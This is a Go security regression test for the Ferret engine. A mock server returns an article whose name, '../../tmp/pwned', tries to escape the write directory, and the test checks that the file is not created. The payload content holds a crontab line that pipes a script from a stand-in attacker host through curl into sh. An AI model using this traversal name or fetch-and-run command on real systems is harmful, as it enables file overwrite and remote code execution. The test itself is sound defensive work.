package security

import (
	"context"
	"errors"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/MontFerret/ferret/v2"
	"github.com/MontFerret/ferret/v2/pkg/source"
	"github.com/goccy/go-json"
)

func TestPathTraversalVulnerability(t *testing.T) {
	type Article struct {
		Name    string `json:"name"`
		Content string `json:"content"`
	}

	root := t.TempDir()
	safeDir := filepath.Join(root, "safe", "ferret_output")
	escapedPath := filepath.Join(root, "tmp", "pwned.txt")
	escapedParent := filepath.Dir(escapedPath)

	if err := os.MkdirAll(safeDir, 0o755); err != nil {
		t.Fatal(err)
	}

	if err := os.MkdirAll(escapedParent, 0o755); err != nil {
		t.Fatal(err)
	}

	engine, err := ferret.New(ferret.WithFSRoot(safeDir))
	if err != nil {
		t.Fatal(err)
	}

	startServer := func(ctx context.Context, ln net.Listener) error {
		mux := http.NewServeMux()

		mux.HandleFunc("/api/articles", func(w http.ResponseWriter, r *http.Request) {
			if r.Method != http.MethodGet {
				http.NotFound(w, r)
				return
			}

			payload := []Article{
				{
					Name:    "legit-article",
					Content: "This is a normal article.",
				},
				{
					Name:    "../../tmp/pwned",
					Content: "ATTACKER_CONTROLLED_CONTENT\n# * * * * * root curl http://attacker.com/shell.sh | sh\n",
				},
			}

			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)

			if err := json.NewEncoder(w).Encode(payload); err != nil {
				http.Error(w, err.Error(), http.StatusInternalServerError)
			}
		})

		mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			http.NotFound(w, r)
		})

		srv := &http.Server{Handler: mux}

		go func() {
			<-ctx.Done()

			shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			_ = srv.Shutdown(shutdownCtx)
		}()

		err := srv.Serve(ln)
		if errors.Is(err, http.ErrServerClosed) {
			return nil
		}
		return err
	}

	serverCtx, cancelServer := context.WithCancel(context.Background())
	defer cancelServer()

	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}

	serverErrCh := make(chan error, 1)
	go func() {
		serverErrCh <- startServer(serverCtx, ln)
	}()

	baseURL := "http://" + ln.Addr().String()

	_, err = engine.Run(context.Background(), source.NewAnonymous(fmt.Sprintf(`
LET response = IO::NET::HTTP::GET({url: "%s/api/articles"})
LET articles = JSON_PARSE(TO_STRING(response))

FOR article IN articles
    LET path = "%s/" + article.name + ".txt"
    LET data = TO_BINARY(article.content)
    IO::FS::WRITE(path, data)
    RETURN { written: path, name: article.name }
`, baseURL, safeDir)))

	if err != nil && !strings.Contains(err.Error(), "path escapes from parent") {
		t.Fatal(err)
	}

	_, err = os.Stat(escapedPath)

	if err == nil {
		t.Fatalf("path traversal vulnerability: write escaped intended directory and created %q", escapedPath)
	}

	cancelServer()

	select {
	case err := <-serverErrCh:
		if err != nil {
			t.Fatalf("server failed: %v", err)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("server did not shut down in time")
	}
}
